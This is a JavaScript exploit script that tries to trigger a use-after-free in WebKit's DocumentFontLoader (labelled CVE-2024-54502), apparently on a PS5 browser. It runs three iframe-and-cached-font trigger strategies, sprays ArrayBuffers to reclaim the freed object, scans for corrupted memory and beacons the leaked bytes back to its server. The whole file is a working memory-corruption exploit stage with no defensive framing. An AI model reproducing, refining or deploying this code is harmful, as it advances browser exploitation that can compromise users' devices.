// p201 — CVE-2024-54502 precision trigger based on source code analysis
//
// DocumentFontLoader.cpp line 95-107:
//   fontLoadingTimerFired() calls loadPendingFonts() which calls
//   beginLoadIfNeeded() (completes synchronously for CACHED fonts)
//   then decrementRequestCount(). After the loop, loadDone() is called.
//   If loadDone() releases the last Document ref → Document freed →
//   DocumentFontLoader freed → but fontLoadingTimerFired() continues
//   accessing m_document on line 101 and 105 → UAF.
//
// Key insight from regression test: TWO iframes with SAME font URL.
// First iframe caches the font. Second iframe triggers cached path
// where beginLoadIfNeeded() completes synchronously.
//
// DocumentFontLoader is WTF_MAKE_FAST_ALLOCATED (fastMalloc heap).
// Size: ~80-128 bytes (Document&, Timer, Vector, 2 bools).
// Same heap as ArrayBuffer backing stores (Gigacage disabled on PS5).
//
// Beacon prefix: V201-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V201-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Font URL — must be reachable and consistent for caching
  var FONT_URL = BASE + '/beacon/V201-FONTREQ';
  var SPRAY_SIZES = [64, 80, 96, 112, 128, 160, 192];
  var SPRAY_PER_SIZE = 3000;
  var MARKER = 0xBAADF00D;
  var ROUNDS = 20;
  var round = 0;
  var alive = true;
  var totalCorrupt = 0;

  function makeSpray(sz) {
    var arr = [];
    for (var i = 0; i < SPRAY_PER_SIZE; i++) {
      var ab = new ArrayBuffer(sz);
      var dv = new DataView(ab);
      dv.setUint32(0, MARKER, true);
      dv.setUint32(4, sz, true);
      dv.setUint32(8, i, true);
      dv.setUint32(12, round, true);
      arr.push(ab);
    }
    return arr;
  }

  function checkSpray(sprays) {
    var corrupt = 0;
    var firstHex = '';
    var hitSize = 0;
    for (var sz in sprays) {
      var arr = sprays[sz];
      for (var i = 0; i < arr.length; i++) {
        var dv = new DataView(arr[i]);
        if (dv.getUint32(0, true) !== MARKER) {
          corrupt++;
          if (!firstHex) {
            hitSize = sz;
            var u8 = new Uint8Array(arr[i]);
            for (var j = 0; j < 64 && j < u8.length; j++) {
              firstHex += ('0' + u8[j].toString(16)).slice(-2);
            }
          }
        }
      }
    }
    if (corrupt > 0) {
      syncB('CORRUPT-N' + corrupt + '-SZ' + hitSize);
      syncB('HEX-' + firstHex.substring(0, 60));
    }
    return corrupt;
  }

  // Build iframe HTML that loads a font and self-removes on load
  function makeIframeHTML(fontUrl, selfRemove) {
    return '<!doctype html><html><head>' +
      '<style>@font-face { font-family: "TrigFont"; ' +
      'src: url("' + fontUrl + '") format("truetype"); } ' +
      'body { font-family: "TrigFont", sans-serif; }</style>' +
      '</head><body>' +
      '<div>ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789</div>' +
      (selfRemove ?
        '<script>window.addEventListener("load", function() { ' +
        'try { window.frameElement.remove(); } catch(e) {} ' +
        '});</' + 'script>' : '') +
      '</body></html>';
  }

  // ================================================================
  // Strategy A: Exact regression test pattern
  // Two iframes, same font URL, second iframe self-removes on load
  // ================================================================
  function strategyA() {
    syncB('A-START');
    var aRound = 0;

    function aNext() {
      if (!alive || aRound >= ROUNDS) {
        syncB('A-DONE-R' + aRound);
        strategyB();
        return;
      }
      aRound++;
      round++;

      var fontUrl = FONT_URL + '?a=' + aRound + '&t=' + Date.now();

      // iframe 1: load and cache the font (no self-remove)
      var f1 = document.createElement('iframe');
      f1.style.cssText = 'width:1px;height:1px;position:absolute;top:-999px;';
      var html1 = makeIframeHTML(fontUrl, false);
      var blob1 = new Blob([html1], { type: 'text/html' });
      var url1 = URL.createObjectURL(blob1);
      f1.src = url1;
      document.body.appendChild(f1);

      // Wait for iframe 1 to load (font gets cached)
      f1.onload = function() {
        syncB('A-R' + aRound + '-F1LOAD');

        // iframe 2: same font URL, self-removes on load
        var f2 = document.createElement('iframe');
        f2.style.cssText = 'width:1px;height:1px;position:absolute;top:-999px;';
        var html2 = makeIframeHTML(fontUrl, true);
        var blob2 = new Blob([html2], { type: 'text/html' });
        var url2 = URL.createObjectURL(blob2);
        f2.src = url2;
        document.body.appendChild(f2);

        // After iframe 2 self-removes, spray to reclaim DocumentFontLoader
        setTimeout(function() {
          syncB('A-R' + aRound + '-SPRAY');

          var sprays = {};
          for (var si = 0; si < SPRAY_SIZES.length; si++) {
            sprays[SPRAY_SIZES[si]] = makeSpray(SPRAY_SIZES[si]);
          }

          // Wait for timer to fire and potential UAF
          setTimeout(function() {
            syncB('A-R' + aRound + '-CHECK');
            var c = checkSpray(sprays);
            totalCorrupt += c;
            sprays = {};

            // Clean up iframe 1
            f1.remove();
            URL.revokeObjectURL(url1);
            URL.revokeObjectURL(url2);

            setTimeout(aNext, 10);
          }, 50);
        }, 30);
      };

      // Timeout if iframe 1 never loads
      setTimeout(function() {
        if (!f1.onload) return;
        f1.onload = null;
        f1.remove();
        URL.revokeObjectURL(url1);
        syncB('A-R' + aRound + '-TIMEOUT');
        setTimeout(aNext, 10);
      }, 2000);
    }

    aNext();
  }

  // ================================================================
  // Strategy B: Parent removes both iframes in quick succession
  // Don't rely on self-removal — parent removes iframe 2 immediately
  // after adding it (before its load event fires)
  // ================================================================
  function strategyB() {
    syncB('B-START');
    var bRound = 0;

    function bNext() {
      if (!alive || bRound >= ROUNDS) {
        syncB('B-DONE-R' + bRound);
        strategyC();
        return;
      }
      bRound++;
      round++;

      var fontUrl = FONT_URL + '?b=' + bRound + '&t=' + Date.now();

      // iframe 1: cache the font
      var f1 = document.createElement('iframe');
      f1.style.cssText = 'width:1px;height:1px;position:absolute;top:-999px;';
      f1.srcdoc = '<!doctype html><html><head>' +
        '<style>@font-face { font-family:"TF";src:url("' + fontUrl + '") format("truetype");} ' +
        'body{font-family:"TF",serif;}</style></head><body>' +
        '<div>TEST TEXT FOR FONT LOADING</div></body></html>';
      document.body.appendChild(f1);

      f1.onload = function() {
        syncB('B-R' + bRound + '-F1LOAD');

        // iframe 2: same font (cached path)
        var f2 = document.createElement('iframe');
        f2.style.cssText = 'width:1px;height:1px;position:absolute;top:-999px;';
        f2.srcdoc = '<!doctype html><html><head>' +
          '<style>@font-face { font-family:"TF";src:url("' + fontUrl + '") format("truetype");} ' +
          'body{font-family:"TF",serif;}</style></head><body>' +
          '<div>TRIGGER TEXT</div></body></html>';
        document.body.appendChild(f2);

        // Remove iframe 2 IMMEDIATELY — before its onload
        // This should detach Frame but leave Document alive if
        // font request count is keeping it alive
        setTimeout(function() {
          f2.remove();
          syncB('B-R' + bRound + '-F2REM');

          // Spray
          var sprays = {};
          for (var si = 0; si < SPRAY_SIZES.length; si++) {
            sprays[SPRAY_SIZES[si]] = makeSpray(SPRAY_SIZES[si]);
          }

          setTimeout(function() {
            syncB('B-R' + bRound + '-CHECK');
            var c = checkSpray(sprays);
            totalCorrupt += c;
            sprays = {};
            f1.remove();
            setTimeout(bNext, 10);
          }, 50);
        }, 0);
      };

      setTimeout(function() {
        if (!f1.onload) return;
        f1.onload = null;
        f1.remove();
        syncB('B-R' + bRound + '-TIMEOUT');
        setTimeout(bNext, 10);
      }, 2000);
    }

    bNext();
  }

  // ================================================================
  // Strategy C: FontFace API on iframe's document
  // Use the FontFace API to trigger beginLoadingFontSoon directly,
  // then remove the iframe while the timer is pending.
  // ================================================================
  function strategyC() {
    syncB('C-START');
    var cRound = 0;

    function cNext() {
      if (!alive || cRound >= ROUNDS) {
        syncB('C-DONE-R' + cRound);
        syncB('TOTAL-CORRUPT-' + totalCorrupt);
        return;
      }
      cRound++;
      round++;

      var f = document.createElement('iframe');
      f.style.cssText = 'width:1px;height:1px;position:absolute;top:-999px;';
      f.srcdoc = '<!doctype html><html><head></head><body>' +
        '<div style="font-family:serif">placeholder</div></body></html>';
      document.body.appendChild(f);

      f.onload = function() {
        syncB('C-R' + cRound + '-LOADED');

        try {
          var fdoc = f.contentDocument;
          var fwin = f.contentWindow;
          if (!fdoc || !fwin) {
            syncB('C-R' + cRound + '-NODOC');
            f.remove();
            setTimeout(cNext, 10);
            return;
          }

          // Add @font-face via FontFace API (triggers beginLoadingFontSoon)
          if (typeof fwin.FontFace !== 'undefined') {
            var fontUrl = FONT_URL + '?c=' + cRound + '&t=' + Date.now();
            var ff = new fwin.FontFace('TestFont', 'url(' + fontUrl + ')');
            fdoc.fonts.add(ff);

            // Trigger font loading by rendering text with the font
            var div = fdoc.createElement('div');
            div.style.fontFamily = '"TestFont", serif';
            div.textContent = 'FONT LOADING TRIGGER TEXT 0123456789';
            fdoc.body.appendChild(div);

            // Force layout to trigger font loading
            void div.offsetHeight;

            syncB('C-R' + cRound + '-FONTADDED');

            // Start the load
            ff.load();

            // Remove iframe while timer is pending
            setTimeout(function() {
              // Clear JS references to iframe document
              fdoc = null;
              fwin = null;
              ff = null;
              div = null;

              f.remove();
              syncB('C-R' + cRound + '-REMOVED');

              // Spray
              var sprays = {};
              for (var si = 0; si < SPRAY_SIZES.length; si++) {
                sprays[SPRAY_SIZES[si]] = makeSpray(SPRAY_SIZES[si]);
              }

              setTimeout(function() {
                syncB('C-R' + cRound + '-CHECK');
                var c = checkSpray(sprays);
                totalCorrupt += c;
                sprays = {};
                setTimeout(cNext, 10);
              }, 50);
            }, 0);
          } else {
            syncB('C-R' + cRound + '-NOFF');
            f.remove();
            setTimeout(cNext, 10);
          }
        } catch(e) {
          syncB('C-R' + cRound + '-ERR-' + (e.message || '').substring(0, 20));
          try { f.remove(); } catch(x) {}
          setTimeout(cNext, 10);
        }
      };

      setTimeout(function() {
        if (!f.onload) return;
        f.onload = null;
        f.remove();
        syncB('C-R' + cRound + '-TIMEOUT');
        setTimeout(cNext, 10);
      }, 2000);
    }

    cNext();
  }

  syncB('START');
  strategyA();

  setTimeout(function() {
    alive = false;
    syncB('TIMEOUT');
  }, 120000);

})();
